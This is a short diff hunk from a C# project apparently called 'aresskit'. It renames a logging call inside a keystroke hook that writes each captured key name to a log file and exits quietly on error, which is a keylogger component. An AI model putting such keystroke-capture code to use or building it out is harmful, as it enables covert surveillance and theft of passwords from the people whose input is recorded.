@@ -62,7 +62,7 @@ namespace aresskit
                 try
                 {
                     using (StreamWriter w = File.AppendText(logFile))
-                        Toolkit.Log(((Keys)vkCode).ToString(), w);
+                        Misc.Log(((Keys)vkCode).ToString(), w);
                 }
                 catch (Exception) { Application.Exit(); } // Close
             }
